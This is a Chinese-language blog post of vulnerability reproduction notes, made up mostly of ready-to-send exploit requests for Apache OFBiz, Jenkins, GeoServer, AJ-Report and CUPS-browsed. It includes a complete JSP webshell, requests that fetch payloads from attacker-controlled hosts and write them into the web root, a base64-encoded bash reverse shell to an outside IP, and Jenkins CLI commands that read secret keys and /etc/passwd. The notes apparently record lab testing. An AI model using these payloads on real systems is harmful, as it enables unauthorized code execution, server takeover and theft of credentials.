<p>该漏洞是由于之前漏洞（CVE-2024-32113、CVE-2024-36104和CVE-2024-38856）未完全修复所导致。在Apache OFBiz版本18.12.16之前，开发人员对这些先前的问题进行了修复，但控制器视图地图状态不同步的根本问题仍然存在。这使得攻击者能够绕过身份验证并访问敏感的仅限管理员的视图地图。</p>
<p>在复现此漏洞之前，我们需要在自己控制的服务器上部署恶意XML文件和CSV文件。</p>
<p>第一个文件是<code>rceschema.xml</code>，此XML schema文件定义了恶意 JSP 的结构：</p>
<pre><code>&lt;data-files xsi:noNamespaceSchemaLocation=&quot;http://ofbiz.apache.org/dtds/datafiles.xsd&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
    &lt;data-file name=&quot;rce&quot; separator-style=&quot;fixed-length&quot; type-code=&quot;text&quot; start-line=&quot;0&quot; encoding-type=&quot;UTF-8&quot;&gt;
        &lt;record name=&quot;rceentry&quot; limit=&quot;many&quot;&gt;
            &lt;field name=&quot;jsp&quot; type=&quot;String&quot; length=&quot;605&quot; position=&quot;0&quot;&gt;&lt;/field&gt;
        &lt;/record&gt;
    &lt;/data-file&gt;
&lt;/data-files&gt;
</code></pre>
<p>第二个文件是<code>rcereport.csv</code>，此CSV文件包含实际的JSP代码：</p>
<pre><code>&lt;%@ page import=&#39;java.io.*&#39; %&gt;&lt;%@ page import=&#39;java.util.*&#39; %&gt;&lt;h1&gt;Ahoy!&lt;/h1&gt;&lt;br&gt;&lt;% String getcmd = request.getParameter(&quot;cmd&quot;); if (getcmd != null) &#123; out.println(&quot;Command: &quot; + getcmd + &quot;&lt;br&gt;&quot;); String cmd1 = &quot;/bin/sh&quot;; String cmd2 = &quot;-c&quot;; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine();&#125;&#125; %&gt;,
</code></pre>
<p>然后发送以下请求：</p>
<pre><code>POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1
Host: target:8443
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 241
Content-Type: application/x-www-form-urlencoded

DATAFILE_LOCATION=http://attacker/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&amp;DATAFILE_IS_URL=true&amp;DEFINITION_LOCATION=http://attacker/rceschema.xml&amp;DEFINITION_IS_URL=true&amp;DEFINITION_NAME=rce
</code></pre>
<p>该请求通过利用viewdatafile视图地图将恶意JSP文件写入Web根目录，从而利用了该漏洞实现远程代码执行。</p>
<p>在JSP webshell被写入后，通过<code>https://localhost:8443/accounting/index.jsp?cmd=id</code>即可执行任意命令</p>
<p>用这个包成功</p>
<pre><code>POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1

Host: 127.0.0.1:8443

Cookie: JSESSIONID=179230503829DC0456EC9E91A591BCB7.jvm1; adminer_permanent=; adminer_sid=f5cccc54dc09d51108d8ea214ee1a1dc; adminer_key=8092110359b49587bb7ade16a8fe0fa7; adminer_version=4.8.1; NX-ANTI-CSRF-TOKEN=0.15829410785017417; OFBiz.Visitor=10000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Te: trailers

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 371



DATAFILE_LOCATION=http://172.20.10.4:8000/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&amp;DATAFILE_IS_URL=true&amp;DEFINITION_LOCATION=http://172.20.10.4:8000/rceschema.xml&amp;DEFINITION_IS_URL=true&amp;DEFINITION_NAME=rce&amp;DATAFILE_LOCATION=http://172.20.10.4:8000/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp

</code></pre>
<p>这里我环境中第一次<code>DATAFILE_LOCATION=http://172.20.10.4:8000/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp</code>总是会被吞掉，服务器也没有访问记录，第二个句子能执行，再在第二句之后加一遍发现都执行成功，但是第一句不知为什么不被执行</p>
<p>访问<code>/accounting/index.jsp?cmd=id</code>rce成功</p>
<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><h3 id="CVE-2024-32113"><a href="#CVE-2024-32113" class="headerlink" title="CVE-2024-32113"></a>CVE-2024-32113</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14733?u_atoken=69f20c2ee3b90c47098229b498693367&u_asig=1a0c384917320260008202245e00fe">ofbiz目录遍历致代码执行漏洞（CVE-2024-32113）分析 - 先知社区</a></p>
<p>**”..&#x2F;“<strong>和</strong>“;”**进行截断绕过filter处理</p>
<p>直接构造 18.12.14 及之前版本通杀的路径 payload，不需要进行目录遍历。</p>
<pre><code>/webtools/control/ListTimezones/ProgramExport?
...
。。。
groovyProgram=&#39;calc.exe&#39;.execute()       
</code></pre>
<p><strong>18.12.13版本：</strong> 主要体现在将ListTimezones的 auth 改为 true，黑名单里增加execute关键字，ControlFilter.doFilter() 中校验了规范化前后的 url 是否一致，以此来判断 url 是否含有特殊字符。</p>
<p><strong>18.12.14版本：</strong><br>网上使用的 payload 是将.换为%2e或;来绕过 18.12.13 版本的修复代码，于是官方在 18.12.14 版本的 ControlFilter.doFilter() 中添加过滤了%2e和;，不过仍然没有修复到问题关键。</p>
<p><img src="/img/20240530152728-11a2b3e2-1e56-1.png" alt="img"></p>
<p><img src="/img/20240530152735-15b0f6ba-1e56-1.png" alt="img"></p>
<h3 id="CVE-2024-36104"><a href="#CVE-2024-36104" class="headerlink" title="CVE-2024-36104"></a>CVE-2024-36104</h3><p>由于对<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=HTTP%E8%AF%B7%E6%B1%82&spm=1001.2101.3001.7020">HTTP请求</a>URL中的特殊字符（如；、%2e）限制不当，威胁者可构造恶意请求利用该漏洞，成功利用可能导致远程代码执行。</p>
<p>Apache OFBiz &lt; 18.12.14</p>
<pre><code>POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
 
groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
</code></pre>
<h3 id="CVE-2024-38856"><a href="#CVE-2024-38856" class="headerlink" title="CVE-2024-38856"></a>CVE-2024-38856</h3><p>apache OFBiz 在处理 view 视图渲染的时候存在逻辑缺陷，未经身份验证的攻击者可通过构造特殊 URL 来覆盖最终的渲染视图，从而执行任意代码。</p>
<pre><code>POST /webtools/control/main/ProgramExport HTTP/1.1
Host: 127.0.0.1:8443
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 272
​
groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
</code></pre>
<h3 id="CVE-2023-51467"><a href="#CVE-2023-51467" class="headerlink" title="CVE-2023-51467"></a>CVE-2023-51467</h3><p>这个漏洞的原因是对于CVE-2023-49070的不完全修复。在Apache OFBiz 18.12.10版本中，官方移除了可能导致RCE漏洞的XMLRPC组件，但没有修复权限绕过问题。来自长亭科技的安全研究员枇杷哥利用这一点找到了另一个可以导致RCE的方法：Groovy表达式注入。</p>
<pre><code>POST /webtools/control/ProgramExport/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1
Host: localhost:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

groovyProgram=throw+new+Exception(&#39;id&#39;.execute().text);
</code></pre>
<pre><code>POST /webtools/control/ProgramExport/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1
Host: localhost:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 71

groovyProgram=&#39;bash+-c+&#123;echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjE3MS4xLzQ0MyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;.execute();
</code></pre>
<h1 id="Apache-OFBiz-SSRF-和远程代码执行漏洞（CVE-2024-45507）"><a href="#Apache-OFBiz-SSRF-和远程代码执行漏洞（CVE-2024-45507）" class="headerlink" title="Apache OFBiz SSRF 和远程代码执行漏洞（CVE-2024-45507）"></a>Apache OFBiz SSRF 和远程代码执行漏洞（CVE-2024-45507）</h1><p>Apache OFBiz 18.12.16之前的版本存在一处SSRF与远程命令执行漏洞，未经身份验证的攻击者可以利用该漏洞执行任意命令并控制服务器。</p>
<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p>向<code>/webtools/control/forgotPassword/StatsSinceStart</code>发送以下POST请求即可：</p>
<pre><code>POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: your-ip:8443
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

statsDecoratorLocation=http://192.168.91.148:8000
</code></pre>
<p>ssrf验证成功</p>
<p>在公共服务器上创建一个恶意的XML文件（payload.xml），例如</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;screens xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xmlns=&quot;http://ofbiz.apache.org/Widget-Screen&quot; xsi:schemaLocation=&quot;http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd&quot;&gt;

    &lt;screen name=&quot;StatsDecorator&quot;&gt;
        &lt;section&gt;
            &lt;actions&gt;
                &lt;set value=&quot;$&#123;groovy:&#39;touch /tmp/success&#39;.execute();&#125;&quot;/&gt;
            &lt;/actions&gt;
        &lt;/section&gt;
    &lt;/screen&gt;
&lt;/screens&gt;
</code></pre>
<p>然后将恶意XML的URL替换进请求中发送：</p>
<pre><code>POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: your-ip:8443
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

statsDecoratorLocation=http://192.168.91.148:8000/payload.xml
</code></pre>
<p>rce success</p>
<h1 id="Jenkins-CLI-接口任意文件读取漏洞（CVE-2024-23897）"><a href="#Jenkins-CLI-接口任意文件读取漏洞（CVE-2024-23897）" class="headerlink" title="Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）"></a>Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）</h1><p>enkins是一个开源的自动化服务器。</p>
<p>Jenkins使用<a target="_blank" rel="noopener" href="https://github.com/kohsuke/args4j">args4j</a>来解析命令行输入，并支持通过HTTP、Websocket等协议远程传入命令行参数。args4j中用户可以通过<code>@</code>字符来加载任意文件，这导致攻击者可以通过该特性来读取服务器上的任意文件。</p>
<p>该漏洞影响Jenkins 2.441及以前的版本。</p>
<p>利用该漏洞可以直接使用官方提供的命令行客户端，在<code>http://localhost:8080/jnlpJars/jenkins-cli.jar</code>下载。</p>
<p>使用该工具读取目标服务器的<code>/proc/self/environ</code>文件，可以找到Jenkins的基础目录，<code>JENKINS_HOME=/var/jenkins_home</code>：</p>
<pre><code>java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 &quot;@/proc/self/environ&quot;
</code></pre>
<p><img src="/img/11.png" alt="img"></p>
<p>（匿名情况下，只能通过命令行的报错读取文件的第一行）</p>
<p>然后，可在该目录下读取敏感文件，如<code>secrets.key</code> or <code>master.key</code></p>
<pre><code>java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 &quot;@/var/jenkins_home/secret.key&quot;
</code></pre>
<p>因为开启了“匿名用户可读”选项，你也可以直接使用<code>connect-node</code>命令读取完整文件内容：</p>
<pre><code>java -jar jenkins-cli.jar -s http://localhost:8080/ -http connect-node &quot;@/etc/passwd&quot;
</code></pre>
<h1 id="GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）"><a href="#GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="headerlink" title="GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）"></a>GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）</h1><p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p>
<p>在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。</p>
<p>在官方<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">漏洞通告</a>中提到可以找到漏洞相关的WFS方法：</p>
<blockquote>
<p>已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求利用此漏洞。已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求利用此漏洞。</p>
</blockquote>
<p>这里使用<code>GetPropertyValue</code>来执行xpath表达式。</p>
<p>基于GET方法的POC：</p>
<pre><code>GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),&#39;touch%20/tmp/success1&#39;) HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
</code></pre>
<p><img src="/img/image-20241120001445232.png" alt="image-20241120001445232"></p>
<p>基于POST方法的POC：</p>
<pre><code>POST /geoserver/wfs HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 356

&lt;wfs:GetPropertyValue service=&#39;WFS&#39; version=&#39;2.0.0&#39;
 xmlns:topp=&#39;http://www.openplans.org/topp&#39;
 xmlns:fes=&#39;http://www.opengis.net/fes/2.0&#39;
 xmlns:wfs=&#39;http://www.opengis.net/wfs/2.0&#39;&gt;
  &lt;wfs:Query typeNames=&#39;sf:archsites&#39;/&gt;
  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),&#39;touch /tmp/success2&#39;)&lt;/wfs:valueReference&gt;
&lt;/wfs:GetPropertyValue&gt;
</code></pre>
<p><img src="/img/image-20241120001729204.png" alt="image-20241120001729204"></p>
<p>修改包要调整<code>Content-Type: application/xml</code></p>
<h1 id="AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）"><a href="#AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）" class="headerlink" title="AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）"></a>AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）</h1><p>AJ-Report是全开源的一个BI平台。在其1.4.0版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。</p>
<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20241120221853461.png" alt="image-20241120221853461"></p>
<p>poc </p>
<pre><code>POST /dataSetParam/verification;swagger-ui/ HTTP/1.1

Host: 127.0.0.1:9095

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Cookie: adminer_permanent=; OFBiz.Visitor=10000

Content-Type: application/json;charset=UTF-8

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: none

Sec-Fetch-User: ?1

Content-Type: application/x-www-form-urlencoded

Content-Length: 341



&#123;&quot;ParamName&quot;:&quot;&quot;,&quot;paramDesc&quot;:&quot;&quot;,&quot;paramType&quot;:&quot;&quot;,&quot;sampleItem&quot;:&quot;1&quot;,&quot;mandatory&quot;:true,&quot;requiredFlag&quot;:1,&quot;validationRules&quot;:&quot;function verification(data)&#123;a = new java.lang.ProcessBuilder(\&quot;id\&quot;).start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss=&#39;&#39;;while((line = r.readLine()) != null)&#123;ss+=line&#125;;return ss;&#125;&quot;&#125;
</code></pre>
<p>依然是要记得改<code>Content-Type: application/json;charset=UTF-8</code></p>
<p>rce成功</p>
<h1 id="OpenPrinting-Cups-Browsed-PDD-FoomaticRIPCommandLine-参数导致远程命令执行漏洞（CVE-2024-47177）"><a href="#OpenPrinting-Cups-Browsed-PDD-FoomaticRIPCommandLine-参数导致远程命令执行漏洞（CVE-2024-47177）" class="headerlink" title="OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）"></a>OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）</h1><p><strong>这个洞在HTB_EvilCUPS遇到过。</strong></p>
<p>OpenPrinting CUPS（通用Unix打印系统）是为类Unix操作系统开发的开源打印系统。它允许计算机充当打印服务器，高效管理本地和网络打印机。Cups-Browsed是CUPS系统的一部分，是一个专门用于浏览网络上其他CUPS服务器共享的远程打印机的守护进程。它可以自动发现和配置网络打印机，让用户更容易访问和使用网络上共享的打印资源，无需手动设置。</p>
<p>在Cups-Browsed 2.0.1及之前的版本中，存在一个由PPD（PostScript打印机描述）文件中的<code>FoomaticRIPCommandLine</code>参数处理不当引起的问题。攻击者可以通过创建一个恶意的IPP（互联网打印协议）服务器来利用这个漏洞，向易受攻击的Cups-Browsed实例发送精心制作的打印机信息，然后在运行易受攻击的Cups-Browsed的系统上执行任意命令。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/evil-ipp-server">vulhub&#x2F;evil-ipp-server: A evil IPP server to reproduce CVE-2024-47177</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ippsec/evil-cups">IppSec&#x2F;evil-cups</a></p>
<blockquote>
<p>python poc.py [evil-ip] [target-ip]</p>
</blockquote>
<p>这个脚本会在<code>[evil-ipp-server-ip]</code>上启动一个恶意的IPP服务器，并向目标机器<code>[target-ip]</code>上的Cups-Browsed服务发送一个UDP数据包。</p>
<p>一旦Cups-Browsed接收到请求，它将尝试连接到恶意的IPP服务器并。IPP服务器会返回精心构造的<code>printer-privacy-policy-uri</code>属性，该属性中包含恶意payload，其结构如下：</p>
<pre><code>(
    SectionEnum.printer,
    b&#39;printer-privacy-policy-uri&#39;,
    TagEnum.uri
): [b&#39;https://www.google.com/&quot;\n*FoomaticRIPCommandLine: &quot;&#39; +
    b&#39;echo 1 &gt; /tmp/I_AM_VULNERABLE&#39; +
    b&#39;&quot;\n*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&#39;],
</code></pre>
<p>然后，Cups-Browsed会在<code>/tmp/</code>目录下创建一个临时PPD文件，我们的payload会被注入到这个文件中。下图是相关的Cups-Browsed日志：</p>
<p><img src="/img/121.png" alt="img"></p>
<p>此时，命令还未执行，因为我们需要至少一个打印任务来触发命令的执行。</p>
<p>打印任务可能来自于正常用户，也可以来自攻击者。如果TCP 631端口开放，我们可以使用浏览器访问，并找到刚才增加的恶意IPP打印机，并创建一个“打印测试页面”的打印任务。</p>
<p>这里环境打不开，先到这里吧。</p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2024/11/17/%E8%87%AA%E5%A2%9ERCE/" title="自增RCE"><span class="has-text-weight-semibold">Next: 自增RCE</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>